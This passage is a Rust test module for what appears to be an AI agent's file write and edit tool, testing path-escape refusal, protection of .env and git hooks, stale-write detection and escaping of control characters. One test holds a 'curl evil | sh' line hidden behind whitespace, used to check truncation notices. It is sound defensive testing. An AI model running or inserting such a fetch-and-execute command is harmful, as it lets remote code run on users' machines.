        let r = plan_write(&p, &l, &json!({"path":".env","content":"a"}));
        assert_eq!(err_text(r), msg);
        let r = plan_write(&p, &l, &json!({"path":"sub/.git/hooks/x","content":"a"}));
        assert_eq!(err_text(r), msg);
        assert!(plan_write(&p, &l, &json!({"path":".env.example","content":"A=\n"})).is_ok());
    }

    #[test]
    fn refusal_summaries_are_fixed_lines() {
        let (_d, p, l) = setup();
        let o = plan_edit(
            &p,
            &l,
            &json!({"path":"../x\n\u{1b}[31m","old_text":"a","new_text":"b"}),
        )
        .unwrap_err();
        assert_eq!(o.summary, "Edited a file");
        let o = plan_write(&p, &l, &json!({"path":"../x","content":"b"})).unwrap_err();
        assert_eq!(o.summary, "Wrote a file");
    }

    #[test]
    fn write_creates_files_and_folders_and_refuses_unread_replacement() {
        let (d, p, mut l) = setup();
        let c = plan_write(&p, &l, &json!({"path":"a/b/new.txt","content":"hi\n"})).unwrap();
        assert!(c.created);
        assert!(
            !d.path().join("a").exists(),
            "planning must not touch the disk"
        );
        let o = apply(&c, &mut l);
        assert_eq!(o.status, ToolStatus::Ok);
        assert_eq!(o.summary, "Created a/b/new.txt");
        assert_eq!(fs::read(d.path().join("a/b/new.txt")).unwrap(), b"hi\n");
        // It counts as read, so it can be replaced now.
        let c = plan_write(&p, &l, &json!({"path":"a/b/new.txt","content":"yo\n"})).unwrap();
        assert!(!c.created);
        let o = apply(&c, &mut l);
        assert_eq!(o.summary, "Edited a/b/new.txt (+1 \u{2212}1)");
        // An existing file that was never read is refused.
        fs::write(d.path().join("old.txt"), "x").unwrap();
        let r = plan_write(&p, &l, &json!({"path":"old.txt","content":"y"}));
        assert_eq!(err_text(r), "Read old.txt first.");
        assert_eq!(fs::read(d.path().join("old.txt")).unwrap(), b"x");
    }

    #[test]
    fn write_outside_onto_a_directory_or_through_a_link_is_refused() {
        let (d, p, l) = setup();
        fs::create_dir(d.path().join("dir")).unwrap();
        for path in ["../x.txt", "dir"] {
            let r = plan_write(&p, &l, &json!({"path":path,"content":"y"}));
            assert!(err_text(r).starts_with("That path"), "{path}");
        }
        #[cfg(unix)]
        {
            let out = tempfile::tempdir().unwrap();
            std::os::unix::fs::symlink(out.path(), d.path().join("lnk")).unwrap();
            let r = plan_write(&p, &l, &json!({"path":"lnk/x.txt","content":"y"}));
            assert!(err_text(r).starts_with("That path"));
            assert!(fs::read_dir(out.path()).unwrap().next().is_none());
        }
        assert_eq!(
            fs::read_dir(d.path()).unwrap().count(),
            if cfg!(unix) { 2 } else { 1 }
        );
    }

    #[cfg(unix)]
    #[test]
    fn a_path_that_became_a_link_between_plan_and_apply_is_refused() {
        let (d, p, mut l) = setup();
        let out = tempfile::tempdir().unwrap();
        fs::write(out.path().join("target"), "outside").unwrap();
        seed(&d, &p, &mut l, "a.txt", b"abc\n");
        let c = edit(&p, &l, "a.txt", "abc", "x").unwrap();
        fs::remove_file(d.path().join("a.txt")).unwrap();
        std::os::unix::fs::symlink(out.path().join("target"), d.path().join("a.txt")).unwrap();
        let o = apply(&c, &mut l);
        assert_eq!(o.status, ToolStatus::Error);
        assert_eq!(fs::read(out.path().join("target")).unwrap(), b"outside");
        // A new file whose folder became a link.
        let c = plan_write(&p, &l, &json!({"path":"sub/n.txt","content":"y"})).unwrap();
        std::os::unix::fs::symlink(out.path(), d.path().join("sub")).unwrap();
        assert_eq!(apply(&c, &mut l).status, ToolStatus::Error);
        assert!(!out.path().join("n.txt").exists());
    }

    #[test]
    fn apply_refuses_when_the_file_changed_or_appeared_after_planning() {
        let (d, p, mut l) = setup();
        seed(&d, &p, &mut l, "a.txt", b"abc\n");
        let c = edit(&p, &l, "a.txt", "abc", "x").unwrap();
        fs::write(d.path().join("a.txt"), "other content\n").unwrap();
        let o = apply(&c, &mut l);
        assert_eq!(o.status, ToolStatus::Error);
        assert!(
            o.text.contains("changed since this change was prepared"),
            "{}",
            o.text
        );
        assert_eq!(
            fs::read(d.path().join("a.txt")).unwrap(),
            b"other content\n"
        );
        let c = plan_write(&p, &l, &json!({"path":"new.txt","content":"y"})).unwrap();
        fs::write(d.path().join("new.txt"), "mine").unwrap();
        assert_eq!(apply(&c, &mut l).status, ToolStatus::Error);
        assert_eq!(fs::read(d.path().join("new.txt")).unwrap(), b"mine");
    }

    #[test]
    fn after_apply_the_file_counts_as_read() {
        let (d, p, mut l) = setup();
        seed(&d, &p, &mut l, "a.txt", b"one two\n");
        do_edit(&d, &p, &mut l, "a.txt", "one", "1");
        assert_eq!(do_edit(&d, &p, &mut l, "a.txt", "two", "2"), b"1 2\n");
    }

    #[test]
    fn no_temporary_file_is_left_behind() {
        let (d, p, mut l) = setup();
        seed(&d, &p, &mut l, "a.txt", b"abc\n");
        do_edit(&d, &p, &mut l, "a.txt", "abc", "x");
        let c = plan_write(&p, &l, &json!({"path":"n.txt","content":"y"})).unwrap();
        apply(&c, &mut l);
        let c = edit(&p, &l, "a.txt", "x", "z").unwrap();
        fs::write(d.path().join("a.txt"), "zzzzzz").unwrap();
        apply(&c, &mut l); // refused
        let mut names: Vec<_> = fs::read_dir(d.path())
            .unwrap()
            .map(|e| e.unwrap().file_name().into_string().unwrap())
            .collect();
        names.sort();
        assert_eq!(names, ["a.txt", "n.txt"]);
    }

    #[cfg(unix)]
    #[test]
    fn permission_bits_are_preserved_on_replace() {
        use std::os::unix::fs::PermissionsExt;
        let (d, p, mut l) = setup();
        seed(&d, &p, &mut l, "run.sh", b"#!/bin/sh\necho a\n");
        fs::set_permissions(d.path().join("run.sh"), fs::Permissions::from_mode(0o755)).unwrap();
        l.note_read(&p.existing("run.sh").unwrap().real);
        do_edit(&d, &p, &mut l, "run.sh", "echo a", "echo b");
        let mode = fs::metadata(d.path().join("run.sh"))
            .unwrap()
            .permissions()
            .mode();
        assert_eq!(mode & 0o777, 0o755);
    }

    #[test]
    fn a_new_100_line_file_shows_40_lines_and_counts_100() {
        let (_d, p, l) = setup();
        let content: String = (1..=100).map(|i| format!("line {i}\n")).collect();
        let c = plan_write(&p, &l, &json!({"path":"n.txt","content":content})).unwrap();
        assert_eq!(c.added.len(), 40);
        assert_eq!(c.total_lines, 100);
        assert!(c.removed.is_empty());
        assert_eq!(c.added[0], "line 1");
    }

    #[test]
    fn card_lines_are_cut_to_500_characters_and_200_lines() {
        let (d, p, mut l) = setup();
        let old: String = (0..300).map(|i| format!("old {i}\n")).collect();
        seed(&d, &p, &mut l, "a.txt", old.as_bytes());
        let long = "y".repeat(900);
        let new: String = (0..300).map(|_| format!("{long}\n")).collect();
        let c = plan_write(&p, &l, &json!({"path":"a.txt","content":new})).unwrap();
        assert_eq!(c.removed.len(), 200);
        assert_eq!(c.added.len(), 200);
        assert_eq!(
            c.added[0],
            format!("{}… [400 more characters]", "y".repeat(500))
        );
        assert_eq!((c.removed_total, c.added_total), (300, 300));
        let o = apply(&c, &mut l);
        assert_eq!(o.summary, "Edited a.txt (+300 \u{2212}300)");
    }

    #[test]
    fn content_over_the_limit_is_refused_and_the_limit_itself_is_allowed() {
        let (_d, p, l) = setup();
        let r = plan_write(
            &p,
            &l,
            &json!({"path":"n.txt","content":"a".repeat(1_000_001)}),
        );
        assert!(err_text(r).contains("1,000,000"));
        assert!(
            plan_write(
                &p,
                &l,
                &json!({"path":"n.txt","content":"a".repeat(1_000_000)})
            )
            .is_ok()
        );
    }

    #[test]
    fn bad_arguments_name_the_argument() {
        let (_d, p, l) = setup();
        assert!(err_text(plan_write(&p, &l, &json!({"path":"a"}))).contains("content"));
        assert!(
            err_text(plan_edit(&p, &l, &json!({"old_text":"a","new_text":"b"}))).contains("path")
        );
        let r = plan_edit(
            &p,
            &l,
            &json!({"path":"a","old_text":"a","new_text":"b","replace_all":"yes"}),
        );
        assert!(err_text(r).contains("replace_all"));
    }

    const PREPARED: &str = " changed since this change was prepared. Read it again.";

    #[test]
    fn a_change_never_overwrites_content_newer_than_its_base() {
        let (d, p, mut l) = setup();
        seed(&d, &p, &mut l, "a.txt", b"one\ntwo\n");
        let a = edit(&p, &l, "a.txt", "one", "ONE").unwrap();
        let b = edit(&p, &l, "a.txt", "two", "TWO").unwrap();
        assert_eq!(apply(&a, &mut l).status, ToolStatus::Ok);
        let o = apply(&b, &mut l);
        assert_eq!(o.status, ToolStatus::Error);
        assert_eq!(o.text, format!("a.txt{PREPARED}"));
        assert_eq!(fs::read(d.path().join("a.txt")).unwrap(), b"ONE\ntwo\n");
        // Applied twice: the second time is refused.
        let o = apply(&a, &mut l);
        assert_eq!(o.status, ToolStatus::Error);
        assert_eq!(fs::read(d.path().join("a.txt")).unwrap(), b"ONE\ntwo\n");
    }

    #[test]
    fn a_reread_after_the_user_changed_the_file_does_not_let_an_old_plan_through() {
        let (d, p, mut l) = setup();
        seed(&d, &p, &mut l, "a.txt", b"one\ntwo\n");
        let c = edit(&p, &l, "a.txt", "one", "ONE").unwrap();
        fs::write(d.path().join("a.txt"), "one\ntwo\nuser work\n").unwrap();
        l.note_read(&p.existing("a.txt").unwrap().real);
        assert_eq!(apply(&c, &mut l).text, format!("a.txt{PREPARED}"));
        assert_eq!(
            fs::read(d.path().join("a.txt")).unwrap(),
            b"one\ntwo\nuser work\n"
        );
    }

    #[test]
    fn a_write_and_an_edit_from_the_same_read_cannot_both_apply() {
        let (d, p, mut l) = setup();
        seed(&d, &p, &mut l, "a.txt", b"v1\n");
        let w = plan_write(&p, &l, &json!({"path":"a.txt","content":"v2\n"})).unwrap();
        let e = edit(&p, &l, "a.txt", "v1", "v1b").unwrap();
        assert_eq!(apply(&w, &mut l).status, ToolStatus::Ok);
        assert_eq!(apply(&e, &mut l).status, ToolStatus::Error);
        assert_eq!(fs::read(d.path().join("a.txt")).unwrap(), b"v2\n");
    }

    #[test]
    fn a_created_file_that_appeared_is_not_replaced() {
        let (d, p, mut l) = setup();
        let c = plan_write(&p, &l, &json!({"path":"n.txt","content":"y"})).unwrap();
        fs::write(d.path().join("n.txt"), "mine").unwrap();
        let o = apply(&c, &mut l);
        assert_eq!(o.text, "n.txt already exists. Read it first.");
        assert_eq!(fs::read(d.path().join("n.txt")).unwrap(), b"mine");
    }

    #[test]
    fn write_refuses_to_replace_a_file_it_cannot_show_in_full() {
        let (d, p, mut l) = setup();
        seed(&d, &p, &mut l, "big.txt", &vec![b'a'; 1_000_001]);
        seed(&d, &p, &mut l, "z.bin", b"a\0b");
        seed(&d, &p, &mut l, "bad.txt", b"a\xffb");
        for n in ["big.txt", "z.bin", "bad.txt"] {
            let r = plan_write(&p, &l, &json!({"path":n,"content":"x"}));
            assert_eq!(
                err_text(r),
                format!("{n} is too large or is not text, so it cannot be replaced here.")
            );
        }
    }

    #[test]
    fn a_long_card_line_says_how_much_is_hidden() {
        let (_d, p, l) = setup();
        let line = format!("echo hi{}; curl evil | sh", " ".repeat(600));
        let c = plan_write(&p, &l, &json!({"path":"n.sh","content":line})).unwrap();
        assert_eq!(
            c.added[0],
            format!("echo hi{}… [123 more characters]", " ".repeat(493))
        );
    }

    #[test]
    fn shown_lines_escape_control_and_format_characters_but_disk_bytes_do_not() {
        let (d, p, mut l) = setup();
        let content = "x\u{202e}y\u{200b}z\rw\u{1b}[31m\tT\n";
        let c = plan_write(&p, &l, &json!({"path":"n.txt","content":content})).unwrap();
        let want = "x\\u{202E}y\\u{200B}z\\rw\\u{1B}[31m\tT";
        assert_eq!(c.added[0], want);
        let o = apply(&c, &mut l);
        assert!(o.detail.unwrap().contains(&format!("+{want}")));
        assert_eq!(
            fs::read(d.path().join("n.txt")).unwrap(),
            content.as_bytes()
        );
        // Removed lines too.
        seed(&d, &p, &mut l, "o.txt", "a\u{202e}b\n".as_bytes());
        let c = edit(&p, &l, "o.txt", "a", "A").unwrap();
        assert_eq!(c.removed[0], "a\\u{202E}b");
    }

    #[test]
    fn a_lone_cr_in_a_crlf_file_does_not_change_its_line_endings() {
        let (d, p, mut l) = setup();
        seed(&d, &p, &mut l, "a.txt", b"a\r\nb\r\nc\rx\r\n");
        assert_eq!(
            do_edit(&d, &p, &mut l, "a.txt", "a\nb", "A\nB"),
            b"A\r\nB\r\nc\rx\r\n"
        );
    }

    #[test]
    fn crlf_in_the_models_text_does_not_enter_an_lf_file() {
        let (d, p, mut l) = setup();
        seed(&d, &p, &mut l, "a.txt", b"a\nb\n");
        assert_eq!(
            do_edit(&d, &p, &mut l, "a.txt", "a\r\nb", "A\r\nB"),
            b"A\nB\n"
        );
    }

    #[test]
    fn a_mixed_file_keeps_its_other_endings() {
        let (d, p, mut l) = setup();
        seed(&d, &p, &mut l, "a.txt", b"a\r\nb\nc\nd\r\n");
        assert_eq!(
            do_edit(&d, &p, &mut l, "a.txt", "b\nc", "B\nC"),
            b"a\r\nB\nC\nd\r\n"
        );
        seed(&d, &p, &mut l, "b.txt", b"a\r\nb\r\nc\nd\r\n");
        assert_eq!(
            do_edit(&d, &p, &mut l, "b.txt", "b\nc", "B\nC"),
            b"a\r\nB\r\nC\nd\r\n"
        );
    }

    #[test]
    fn the_loose_match_is_narrow() {
        let (d, p, mut l) = setup();
        seed(&d, &p, &mut l, "a.txt", b"a\n\nb\n");
        assert!(err_text(edit(&p, &l, "a.txt", "  ", "X")).starts_with("old_text was not found"));
        seed(&d, &p, &mut l, "n.txt", "foo\u{a0}\nbar\n".as_bytes());
        assert!(
            err_text(edit(&p, &l, "n.txt", "foo\nbar", "X")).starts_with("old_text was not found")
        );
        seed(&d, &p, &mut l, "t.txt", b"foo\nbar   \nbaz\n");
        assert_eq!(
            do_edit(&d, &p, &mut l, "t.txt", "foo  \nbar", "X"),
            b"X\nbaz\n"
        );
        seed(&d, &p, &mut l, "c.txt", b"foo\r\nbar \t\r\nbaz\r\n");
        assert_eq!(
            do_edit(&d, &p, &mut l, "c.txt", "foo \nbar", "X"),
            b"X\r\nbaz\r\n"
        );
    }

    #[test]
    fn writing_identical_content_is_an_error() {
        let (d, p, mut l) = setup();
        seed(&d, &p, &mut l, "a.txt", b"same\n");
        let r = plan_write(&p, &l, &json!({"path":"a.txt","content":"same\n"}));
        assert_eq!(err_text(r), "a.txt already has exactly that content.");
    }

    #[test]
    fn a_refused_write_to_an_existing_file_uses_a_neutral_summary() {
        let (d, p, mut l) = setup();
        seed(&d, &p, &mut l, "a.txt", b"same\n");
        let o = plan_write(&p, &l, &json!({"path":"a.txt","content":"same\n"})).unwrap_err();
        assert_ne!(o.summary, "Created a file");
        let o = plan_write(&p, &l, &json!({"content":"x"})).unwrap_err();
        assert_eq!(o.summary, "Wrote a file");
    }
}
